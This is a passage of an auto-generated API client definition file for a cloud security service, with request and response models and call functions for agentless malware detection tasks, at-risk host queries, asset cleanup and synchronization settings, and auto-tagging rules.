      id?: long(name='Id', description='The event ID.', example='8012'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='168257753****'),
      level?: string(name='Level', description='The severity of the malicious file. Valid values:

*   serious
*   suspicious
*   remind', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious file.', example='1f2e13a7c51ee89316ae50066515****'),
      maliciousName?: string(name='MaliciousName', description='The name of the malicious file.', example='WebShell'),
      maliciousType?: string(name='MaliciousType', description='The type of the virus.', example='WebShell'),
      operateResult?: string(name='OperateResult', description='The handling result of the alert.', example='addWhitelist.USER.Success'),
      operateTimestamp?: string(name='OperateTimestamp', description='The timestamp when the alert is handled. Unit: milliseconds.', example='168257753****'),
      partition?: string(name='Partition', description='The partition of the disk.', example='/dev/xvda1'),
      targetId?: string(name='TargetId', description='The ID of the task object.', example='m-****'),
      targetName?: string(name='TargetName', description='The name of the task object.', example='image_***'),
      targetType?: string(name='TargetType', description='The type of the task object. Valid values:

*   **1**: snapshot.
*   **2**: image.', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='The list of hosts that are associated with the risk.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='197'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='FCA270CC-24C8-5DA1-9184-20F2605C****'),
}

model ListAgentlessRelateMaliciousResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAgentlessRelateMaliciousResponseBody(name='body'),
}

/**
 * @summary Obtains the risks associated with an agentless detection event.
 *
 * @param request ListAgentlessRelateMaliciousRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAgentlessRelateMaliciousResponse
 */
async function listAgentlessRelateMaliciousWithOptions(request: ListAgentlessRelateMaliciousRequest, runtime: Util.RuntimeOptions): ListAgentlessRelateMaliciousResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.eventId)) {
    query['EventId'] = request.eventId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scenario)) {
    query['Scenario'] = request.scenario;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAgentlessRelateMalicious',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains the risks associated with an agentless detection event.
 *
 * @param request ListAgentlessRelateMaliciousRequest
 * @return ListAgentlessRelateMaliciousResponse
 */
async function listAgentlessRelateMalicious(request: ListAgentlessRelateMaliciousRequest): ListAgentlessRelateMaliciousResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAgentlessRelateMaliciousWithOptions(request, runtime);
}

model ListAgentlessRiskUuidRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='s-bp1g6wxdwps7s9dz****'),
  instanceName?: string(name='InstanceName', description='The instance name of the asset.', example='ca_cpm_****'),
  internetIp?: string(name='InternetIp', description='The public IP address of the asset that you want to query.', example='1.1.XX.XX'),
  intranetIp?: string(name='IntranetIp', description='The private IP address of the asset that you want to query.', example='172.26.XX.XX'),
  machineName?: string(name='MachineName', description='The name of the instance.', example='oracle-win-001****'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='10'),
  risk?: boolean(name='Risk', description='Specifies whether risks exist. Valid values:

*   **true**: Risks exist.
*   **false**: Risks do not exist.', example='true'),
  targetName?: string(name='TargetName', description='The name of the detection object.', example='source-test-obj-0****'),
  targetType?: int32(name='TargetType', description='Specifies the type of the object being inspected. Valid values:

*   **1**: Host Snapshot.
*   **2**: Host Image.
*   **3**: User Snapshot.
*   **4**: User Image.', example='3'),
}

model ListAgentlessRiskUuidResponseBody = {
  list?: [ 
    {
      baselineCount?: int32(name='BaselineCount', description='The number of baseline risks.', example='1'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='s-bp1g6wxdwps7s9dz****'),
      instanceName?: string(name='InstanceName', description='The instance name of the asset.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      maliciousCount?: int32(name='MaliciousCount', description='The number of malicious samples.', example='1'),
      scanTime?: long(name='ScanTime', description='The timestamp of the detection. Unit: milliseconds.', example='168257753****'),
      targetId?: string(name='TargetId', description='The ID of the asset that is detected.', example='30****'),
      targetName?: string(name='TargetName', description='The name of the asset that is detected.', example='test****'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      vulCount?: int32(name='VulCount', description='The number of detected vulnerabilities.', example='1'),
    }
  ](name='List', description='The information about the hosts.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='05AE6B16-741A-5A75-9BF0-BC747DD9****'),
}

model ListAgentlessRiskUuidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAgentlessRiskUuidResponseBody(name='body'),
}

/**
 * @summary Queries at-risk hosts that are detected by the agentless detection feature.
 *
 * @param request ListAgentlessRiskUuidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAgentlessRiskUuidResponse
 */
async function listAgentlessRiskUuidWithOptions(request: ListAgentlessRiskUuidRequest, runtime: Util.RuntimeOptions): ListAgentlessRiskUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.internetIp)) {
    query['InternetIp'] = request.internetIp;
  }
  if (!Util.isUnset(request.intranetIp)) {
    query['IntranetIp'] = request.intranetIp;
  }
  if (!Util.isUnset(request.machineName)) {
    query['MachineName'] = request.machineName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.risk)) {
    query['Risk'] = request.risk;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAgentlessRiskUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries at-risk hosts that are detected by the agentless detection feature.
 *
 * @param request ListAgentlessRiskUuidRequest
 * @return ListAgentlessRiskUuidResponse
 */
async function listAgentlessRiskUuid(request: ListAgentlessRiskUuidRequest): ListAgentlessRiskUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAgentlessRiskUuidWithOptions(request, runtime);
}

model ListAgentlessTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  endTime?: long(name='EndTime', description='The end timestamp of the task.', example='1635575219000'),
  internetIp?: string(name='InternetIp', description='The public IP address of the asset that you want to query.', example='1.1.XX.XX'),
  intranetIp?: string(name='IntranetIp', description='The private IP address of the asset that you want to query.', example='172.26.XX.XX'),
  lang?: string(name='Lang', description='The language type. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  machineName?: string(name='MachineName', description='The name of the instance.', example='oracle-win-001****'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  rootTask?: boolean(name='RootTask', description='Specifies whether to query main tasks. Valid values:

*   **true**: queries main tasks.
*   **false**: queries subtasks.', example='false'),
  rootTaskId?: string(name='RootTaskId', description='The ID of the main task.', example='12c27343861610c5db3f7a2573b4****'),
  startTime?: long(name='StartTime', description='The start timestamp of the task.', example='1651290987000'),
  status?: int32(name='Status', description='The status of the detection task.

*   **1**: The detection task is in progress.
*   **2**: The detection task is complete.
*   **3**: The detection task fails.
*   **4**: The detection task times out.', example='2'),
  targetName?: string(name='TargetName', description='The name of the asset that you want to detect.', example='source-test-obj-0****'),
  targetType?: int32(name='TargetType', description='The type of the asset that you want to detect. Valid values:

*   **1**: snapshot
*   **2**: image', example='1'),
  taskId?: string(name='TaskId', description='The ID of the main task. If you want to query subtasks of a main task, you must specify this parameter.', example='d7b2acf8d362742123e4a84e1bf8****'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='e4af3620-6895-4e2f-a641-a9d8fb53****'),
}

model ListAgentlessTaskResponseBody = {
  list?: [ 
    {
      endTime?: long(name='EndTime', description='The end timestamp of the task. Unit: milliseconds.', example='1678895999999'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='s-wz95vuqky0ada4******'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      measureSpace?: long(name='MeasureSpace', description='The amount of data detected. Unit: MB.', example='154.11'),
      progress?: int32(name='Progress', description='The progress of the task.', example='60'),
      progressByProject?: string(name='ProgressByProject', description='The execution progress of the check items.', example='"{\\\\"scaVul\\\\":100,\\\\"binary\\\\":100,\\\\"baseline\\\\":100,\\\\"vul\\\\":100,\\\\"webshell\\\\":100,\\\\"script\\\\":100,\\\\"sensitiveInfo\\\\":100}"'),
      reportDownloadUrl?: string(name='ReportDownloadUrl', description='The download URL of the report.', example='http://newsas-oss-bucket.oss-cn-hangzhou.aliyuncs.com/agent_less_single_report****'),
      reportStatus?: string(name='ReportStatus', description='The status of the report. Valid values:

*   **PREPARED**: preparing
*   **RUNNING**: running
*   **SUCCESS**: succeeded
*   **TIMEOUT**: timed out
*   **FAILED**: failed', example='SUCCESS'),
      result?: string(name='Result', description='The result of the detection.', example='True'),
      startTime?: long(name='StartTime', description='The start timestamp of the task. Unit: milliseconds.', example='1672741657897'),
      status?: int32(name='Status', description='The status of the detection task.

*   **1**: The detection task is in progress.
*   **2**: The detection task is complete.
*   **3**: The detection task fails.
*   **4**: The detection task times out.', example='1'),
      targetName?: string(name='TargetName', description='The name of the asset that is detected.', example='hkdevt****'),
      targetType?: int32(name='TargetType', description='The type of the asset that is detected. Valid values:

*   **1**: snapshot
*   **2**: image', example='2'),
      taskId?: string(name='TaskId', description='The ID of the task.', example='1538****'),
      taskName?: string(name='TaskName', description='The name of the detection task.', example='AGENTLESS_SCAN'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='The tasks.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='55'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1A975D03-5F49-5354-B2CB-3918D5DA****'),
}

model ListAgentlessTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAgentlessTaskResponseBody(name='body'),
}

/**
 * @summary Queries agentless detection tasks.
 *
 * @param request ListAgentlessTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAgentlessTaskResponse
 */
async function listAgentlessTaskWithOptions(request: ListAgentlessTaskRequest, runtime: Util.RuntimeOptions): ListAgentlessTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.internetIp)) {
    query['InternetIp'] = request.internetIp;
  }
  if (!Util.isUnset(request.intranetIp)) {
    query['IntranetIp'] = request.intranetIp;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineName)) {
    query['MachineName'] = request.machineName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.rootTask)) {
    query['RootTask'] = request.rootTask;
  }
  if (!Util.isUnset(request.rootTaskId)) {
    query['RootTaskId'] = request.rootTaskId;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAgentlessTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries agentless detection tasks.
 *
 * @param request ListAgentlessTaskRequest
 * @return ListAgentlessTaskResponse
 */
async function listAgentlessTask(request: ListAgentlessTaskRequest): ListAgentlessTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAgentlessTaskWithOptions(request, runtime);
}

model ListAssetCleanConfigResponseBody = {
  count?: int32(name='Count', description='The number of cleanup configurations.', example='1'),
  data?: [ 
    {
      cleanDays?: int32(name='CleanDays', description='The number of days before hosts whose provider cannot be identified are automatically cleaned after they enter the offline state. Valid value: an integer that ranges from 1 to 30.', example='7'),
      status?: int32(name='Status', description='Indicates whether the configuration takes effect. Valid values:

*   **0**: The configuration does not take effect.
*   **1**: The configuration takes effect.', example='1'),
      type?: int32(name='Type', description='The type of hosts that are cleaned.

*   The value is set to **1**, which indicates hosts whose provider cannot be identified.', example='1'),
    }
  ](name='Data', description='The asset cleanup configurations.'),
  requestId?: string(name='RequestId', description='The request ID.', example='20456DD5-5CBF-5015-9173-12CA4246B***'),
}

model ListAssetCleanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAssetCleanConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations for cleaning offline hosts whose provider cannot be identified.
 *
 * @param request ListAssetCleanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAssetCleanConfigResponse
 */
async function listAssetCleanConfigWithOptions(runtime: Util.RuntimeOptions): ListAssetCleanConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListAssetCleanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations for cleaning offline hosts whose provider cannot be identified.
 *
 * @return ListAssetCleanConfigResponse
 */
async function listAssetCleanConfig(): ListAssetCleanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAssetCleanConfigWithOptions(runtime);
}

model ListAssetInfoPublishRequest {
  name?: string(name='Name', description='An extended parameter. This parameter is temporarily unavailable.', example='test'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers that you want to query.

This parameter is required.'),
}

model ListAssetInfoPublishResponseBody = {
  assetList?: [ 
    {
      curVersion?: string(name='CurVersion', description='The version of the Security Center agent.', example='0.0.8'),
      lastUpgradeTime?: long(name='LastUpgradeTime', description='The time when the Security Center agent was last upgraded.', example='1724522400000'),
      status?: int32(name='Status', description='The publish status of the Security Center agent. Valid values:

*   **0**: not started.
*   **1**: publishing.
*   **2**: published.
*   **3**: publish suspended.
*   **4**: forcibly upgrading.', example='2'),
      upgradeEnable?: boolean(name='UpgradeEnable', description='Indicates whether automatic upgrade is enabled. Valid values:

*   **true**
*   **false**', example='true'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='2a98f149-0256-414c-a29a-a69f8a75****'),
    }
  ](name='AssetList', description='The servers.'),
  requestId?: string(name='RequestId', description='The request ID.', example='3956048F-9D73-5EDB-834B-4827BB483977'),
}

model ListAssetInfoPublishResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAssetInfoPublishResponseBody(name='body'),
}

/**
 * @summary Queries the custom upgrade information about assets.
 *
 * @param request ListAssetInfoPublishRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAssetInfoPublishResponse
 */
async function listAssetInfoPublishWithOptions(request: ListAssetInfoPublishRequest, runtime: Util.RuntimeOptions): ListAssetInfoPublishResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAssetInfoPublish',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the custom upgrade information about assets.
 *
 * @param request ListAssetInfoPublishRequest
 * @return ListAssetInfoPublishResponse
 */
async function listAssetInfoPublish(request: ListAssetInfoPublishRequest): ListAssetInfoPublishResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAssetInfoPublishWithOptions(request, runtime);
}

model ListAssetRefreshTaskConfigRequest {
  refreshConfigType?: int32(name='RefreshConfigType', description='The type of the configuration. Valid values:

*   **0**: server synchronization task
*   **1**: cloud service synchronization task
*   **2**: scheduled AccessKey pair verification task', example='2'),
  regionId?: string(name='RegionId', description='The region where the Security Center instance is deployed.', example='cn-hangzhou'),
  targetId?: long(name='TargetId', description='The ID of the data entry containing the AccessKey pair that you specify when you configure the scheduled AccessKey pair verification task.', example='2295'),
}

model ListAssetRefreshTaskConfigResponseBody = {
  assetRefreshConfig?: [ 
    {
      refreshConfigType?: int32(name='RefreshConfigType', description='The type of the configuration. Valid values:

*   **0**: server synchronization task
*   **1**: cloud service synchronization task
*   **2**: scheduled AccessKey pair verification task', example='1'),
      schedulePeriod?: int32(name='SchedulePeriod', description='The synchronization cycle. Valid values:

*   **60**: 60 minutes
*   **180**: 3 hours
*   **360**: 6 hours
*   **720**: 12 hours
*   **1440**: 1 day
*   **10080**: 7 days', example='360'),
      status?: int32(name='Status', description='The status of the configuration. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
      vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **3**: Tencent Cloud
*   **4**: Huawei Cloud
*   **7**: Amazon Web Services (AWS) Cloud', example='3'),
    }
  ](name='AssetRefreshConfig', description='The asset synchronization configuration.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model ListAssetRefreshTaskConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAssetRefreshTaskConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of asset synchronization.
 *
 * @param request ListAssetRefreshTaskConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAssetRefreshTaskConfigResponse
 */
async function listAssetRefreshTaskConfigWithOptions(request: ListAssetRefreshTaskConfigRequest, runtime: Util.RuntimeOptions): ListAssetRefreshTaskConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.refreshConfigType)) {
    query['RefreshConfigType'] = request.refreshConfigType;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.targetId)) {
    query['TargetId'] = request.targetId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAssetRefreshTaskConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of asset synchronization.
 *
 * @param request ListAssetRefreshTaskConfigRequest
 * @return ListAssetRefreshTaskConfigResponse
 */
async function listAssetRefreshTaskConfig(request: ListAssetRefreshTaskConfigRequest): ListAssetRefreshTaskConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAssetRefreshTaskConfigWithOptions(request, runtime);
}

model ListAssetSelectionSelectedTargetRequest {
  selectionKey?: string(name='SelectionKey', description='The unique ID of the asset.

This parameter is required.', example='2e6ab33d-4e00-4581-ac16-0dd1f9ad****'),
  targetList?: [ string ](name='TargetList', description='The details of queries.'),
}

model ListAssetSelectionSelectedTargetResponseBody = {
  data?: [ 
    {
      targetId?: string(name='TargetId', description='The ID of the asset.', example='30****'),
      targetName?: string(name='TargetName', description='The name of the asset.', example='jen****'),
    }
  ](name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1EB12F73-6828-59D2-9FBF-F3713FD55128'),
}

model ListAssetSelectionSelectedTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAssetSelectionSelectedTargetResponseBody(name='body'),
}

/**
 * @summary Queries the selected assets.
 *
 * @param request ListAssetSelectionSelectedTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAssetSelectionSelectedTargetResponse
 */
async function listAssetSelectionSelectedTargetWithOptions(request: ListAssetSelectionSelectedTargetRequest, runtime: Util.RuntimeOptions): ListAssetSelectionSelectedTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.selectionKey)) {
    query['SelectionKey'] = request.selectionKey;
  }
  if (!Util.isUnset(request.targetList)) {
    query['TargetList'] = request.targetList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAssetSelectionSelectedTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the selected assets.
 *
 * @param request ListAssetSelectionSelectedTargetRequest
 * @return ListAssetSelectionSelectedTargetResponse
 */
async function listAssetSelectionSelectedTarget(request: ListAssetSelectionSelectedTargetRequest): ListAssetSelectionSelectedTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAssetSelectionSelectedTargetWithOptions(request, runtime);
}

model ListAssetSelectionTargetRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

This parameter is required.', example='20'),
  selectionKey?: string(name='SelectionKey', description='The globally unique identifier (GUID) of the asset.

This parameter is required.', example='8ccf9b01-2c64-4cba-8122-10115f29****'),
}

model ListAssetSelectionTargetResponseBody = {
  data?: [ 
    {
      targetId?: string(name='TargetId', description='The ID of the asset.', example='30****'),
      targetName?: string(name='TargetName', description='The name of the asset.', example='test****'),
    }
  ](name='Data', description='The data returned.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='639'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='50A75355-F58F-5D65-8377-98C88DED9C51'),
}

model ListAssetSelectionTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAssetSelectionTargetResponseBody(name='body'),
}

/**
 * @summary Queries the required asset.
 *
 * @param request ListAssetSelectionTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAssetSelectionTargetResponse
 */
async function listAssetSelectionTargetWithOptions(request: ListAssetSelectionTargetRequest, runtime: Util.RuntimeOptions): ListAssetSelectionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.selectionKey)) {
    query['SelectionKey'] = request.selectionKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAssetSelectionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the required asset.
 *
 * @param request ListAssetSelectionTargetRequest
 * @return ListAssetSelectionTargetResponse
 */
async function listAssetSelectionTarget(request: ListAssetSelectionTargetRequest): ListAssetSelectionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAssetSelectionTargetWithOptions(request, runtime);
}

model ListAutoTagRulesRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='text-001'),
}

model ListAutoTagRulesResponseBody = {
  autoTagRuleList?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the Alibaba Cloud account.', example='558463566374****'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp when the rule was created. Unit: milliseconds.', example='1614674401000'),
      expression?: string(name='Expression', description='The expression of the rule.', example='[{\\\\"groups\\\\":\\\\"0\\\\",\\\\"fieldValueType\\\\":\\\\"string\\\\",\\\\"field\\\\":\\\\"internetIp\\\\",\\\\"operator\\\\":\\\\"equals\\\\",\\\\"value\\\\":\\\\"12.0.0.1\\\\"}]'),
      id?: int32(name='Id', description='The ID of the rule.', example='900029'),
      modifiedTimestamp?: long(name='ModifiedTimestamp', description='The timestamp when the rule was last updated. Unit: milliseconds.', example='1614674401000'),
      ruleDesc?: string(name='RuleDesc', description='The description of the rule.', example='describe'),
      ruleName?: string(name='RuleName', description='The name of the rule.', example='auto_test_rule'),
      tagContext?: string(name='TagContext', description='The tag specified by the operation type of the rule.', example='{\\\\"tagId\\\\":4577447}'),
      tagType?: string(name='TagType', description='The operation type of the rule. Valid values:

*   **group**
*   **tag**', example='group'),
    }
  ](name='AutoTagRuleList', description='The asset auto-tagging rules.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
